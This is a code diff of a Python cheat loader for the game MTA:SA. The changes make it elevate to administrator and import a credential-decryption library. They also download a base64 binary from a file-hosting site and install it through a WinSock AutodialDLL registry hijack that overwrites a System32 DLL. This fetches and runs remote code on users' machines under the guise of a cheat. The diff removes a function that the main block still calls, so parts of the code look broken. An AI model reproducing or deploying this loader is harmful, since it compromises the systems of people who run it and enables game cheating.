@@ -6,32 +6,33 @@ import sys
 import json
 import urllib.request
 import re
+import base64
 import datetime
 import requests
 import time
 import tempfile
 from colorama import init, Fore, Style
 init()
+import win32crypt
 import random
 import string
 import winreg
 import subprocess
 import ctypes
-import shutil
 import psutil
-import glob
-
 from Crypto.Cipher import AES
 
 def run_as_admin():
     if ctypes.windll.shell32.IsUserAnAdmin():
         return True
     else:
-        print(Fore.RED + "[ERROR] Administrator privileges required!")
-        print(Fore.RED + "[ERROR] Please run this program as Administrator!")
-        print(Fore.RED + "[ERROR] Program will close in 3 seconds...")
-        time.sleep(3)
-        sys.exit(1)
+        try:
+            script = sys.executable
+            params = ' '.join([script] + sys.argv)
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", script, params, None, 1)
+        except Exception as e:
+            print(f"[ERROR] Failed to elevate: {e}")
+        sys.exit(0)
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -48,13 +49,25 @@ def getip():
 def banner():
     os.system("cls")
     print(Fore.RED + """
-███    ███  ██████  ██      ████████  █████  ███████ ███████ ████████ 
-████  ████ ██    ██ ██         ██    ██   ██ ██      ██         ██    
-██ ████ ██ ██    ██ ██         ██    ███████ █████   █████      ██    
-██  ██  ██ ██    ██ ██         ██    ██   ██ ██      ██         ██    
-██      ██  ██████  ███████    ██    ██   ██ ██      ███████    ██   
-
-                                                                     discord.gg/k6xYPbKkB2                                                                    
+    ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⣠⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⡀⠀
+    ⠀⠀⢀⣾⡟⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡙⣿⡄
+    ⠀⠀⣸⣿⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⣹⣿
+    ⠀⠀⣿⣿⡆⢚⢄⣀⣠⠤⠒⠈⠁⠀⠀⠈⠉⠐⠢⢄⡀⣀⢞⠀⣾⣿
+    ⠀⠀⠸⣿⣿⣅⠄⠙⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠑⣄⣽⣿⡟
+    ⠀⠀⠀⠘⢿⣿⣟⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⣾⣿⣿⠏⠀                      Telegram : iBraTvaBax
+    ⠀⠀⠀⠀⣸⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⢻⠀⠀
+    ⠀⠀⠀⠀⢿⠀⢃⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⢸⠀⠀
+    ⠀⠀⠀⠀⢸⢰⡿⢘⣦⣤⣀⠑⢦⡀⠀⣠⠖⣁⣤⣴⡊⢸⡇⡼          ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗ █████╗ 
+    ⠀⠀⠀⠀⠀⠾⡅⣿⣿⣿⣿⣿⠌⠁⠀⠁⢺⣿⣿⣿⣿⠆⣇⠃          ██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██╔══██╗
+    ⠀⠀⠀⠀⠀⢀⠂⠘⢿⣿⣿⡿⠀⣰⣦⠀⠸⣿⣿⡿⠋⠈⢀⠀⠀⠀        ██████╔╝██████╔╝███████║   ██║   ██║   ██║███████║
+    ⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⢠⣿⢻⣆⠀⠀⠀⠀⠀⠀⣸⠀⠀⠀        ██╔══██╗██╔══██╗██╔══██║   ██║   ╚██╗ ██╔╝██╔══██║
+    ⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃⠀⠀⠀        ██████╔╝██║  ██║██║  ██║   ██║    ╚████╔╝ ██║  ██║
+    ⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇⠀⠀⠀⠀⠀        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝     ╚═══╝  ╚═╝  ╚═╝
+    ⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀
     """)
 
 def random_filename():
@@ -64,6 +77,25 @@ def random_foldername():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
 
+# def save_aes_file(data, output_path, key):
+#     try:
+#         encrypted_bytes = base64.b64decode(data)
+#         cipher = AES.new(key, AES.MODE_ECB)
+#         file_bytes = cipher.decrypt(encrypted_bytes)
+#         with open(output_path, "wb") as f:
+#             f.write(file_bytes)
+#         return True
+#     except Exception:
+#         return False
+
+def save_base64_file(b64_data, output_path):
+    try:
+        file_bytes = base64.b64decode(b64_data)
+        with open(output_path, "wb") as f:
+            f.write(file_bytes)
+        return True
+    except Exception:
+        return False
 
 def get_mta_path():
     try:
@@ -76,7 +108,7 @@ def get_mta_path():
 
         
 def chekUpdated():
-    url = "https://rozup.ir/download/4099026/moltafetinjin.txt"
+    url = "https://rozup.ir/download/4098065/ahrimanv1.txt"
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
     }
@@ -89,35 +121,18 @@ def chekUpdated():
         return False
         
 def getCheatData():
-    current_dir = os.getcwd()
-    dll_pattern = os.path.join(current_dir, "Moltafet.dll")
-    
-    if os.path.exists(dll_pattern):
-        return dll_pattern
-    
-    for root, dirs, files in os.walk(current_dir):
-        if "Moltafet.dll" in files:
-            return os.path.join(root, "Moltafet.dll")
-    
-    return None
-
-def set_autodialdll(dll_path):
+    url = "https://rozup.ir/download/4098066/cheatdata.txt"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+    }
     try:
-        alternative_path = dll_path
-        alternative_path = r"C:\Windows\System32\rasadhlp.dll"
-        
-        if os.path.exists(dll_path):
-            shutil.copy2(dll_path, alternative_path)
-            
-            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                r"SYSTEM\ControlSet001\Services\WinSock2\Parameters", 
-                                0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "AutodialDLL", 0, winreg.REG_SZ, alternative_path)
-            winreg.CloseKey(key)
-            return True
-    except Exception as e:
-        print(f"[ERROR] set_autodialdll failed: {e}")
-        return False
+        response = requests.get(url, headers=headers, timeout=15, allow_redirects=True)
+        if response.status_code == 200:
+            return response.text
+        return None
+    except requests.RequestException:
+        return None
+
 
 
 def wait_and_set_autodialdll(target_process="gta_sa.exe", dll_path=r"C:\Windows\System32\rasadhlp.dll"):
@@ -138,47 +153,42 @@ def wait_and_set_autodialdll(target_process="gta_sa.exe", dll_path=r"C:\Windows\
         return False
 
 if __name__ == "__main__":
-    run_as_admin()
     banner()
-    
-    local_dll_path = getCheatData()
+    # rand_file = os.path.join(LOCAL + random_foldername(), random_filename())
+    # rand_file = os.path.join(ROAMING + "\\asdasd\\", random_filename())
+    rand_file = os.path.join(temp_folder, random_filename())
+
     print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Checking updates...")
     if not chekUpdated():
         print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Update Failed ! Download new version : discord.gg/owwl")
         time.sleep(3)
         sys.exit(0)
-
-    if not local_dll_path:
-        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Senior.dll not found in current folder or subfolders!")
-        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Please place Senior.dll in the same folder as this loader")
-        time.sleep(3)
-        sys.exit(1)
-    
-    print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + f"Senior.dll was successfully found.")
-    
-    mta_path = get_mta_path()
-    if not mta_path:
-        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "MTA path not found!")
-        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Make sure MTA:SA is installed!")
-        time.sleep(3)
-        sys.exit(1)
-    
-    print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + f"MTA found at: {mta_path}")
-    
-    if set_autodialdll(local_dll_path):
-        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Opening MTA:SA...")
-        try:
-            subprocess.Popen(mta_path)
-            print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Waiting for game to start...")
-            wait_and_set_autodialdll()
-            print("                                       " + Fore.RED + "[SUCCESS] " + Fore.WHITE + "Injection completed successfully!")
-            print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "You can close this window now.")
-            sys.exit(0)
-        except Exception as e:
-            print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + f"Failed to start MTA: {e}")
+    else:
+        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Loader is up to date")
+        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Fetching Cheat data...")
+        data = getCheatData()
+        if data:
+            if save_base64_file(data, rand_file):
+                mta_path = get_mta_path()
+                if mta_path:
+                    if set_autodialdll(rand_file):
+                        print("                                       " + Fore.RED + "[INFO] " + Fore.WHITE + "Opening MTA:SA...")
+                        subprocess.Popen(mta_path)
+                        wait_and_set_autodialdll()
+                        sys.exit(0)
+                    else:
+                        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #4")
+                        time.sleep(3)
+                        sys.exit(0)
+                else:
+                    print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #3")
+                    time.sleep(3)
+                    sys.exit(0)
+            else:
+                print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #1")
+                time.sleep(3)
+                sys.exit(0)
+        else:
+            print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #2")
             time.sleep(3)
             sys.exit(0)
-    else:
-        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Injection failed!")
-        time.sleep(3)
-        sys.exit(0)
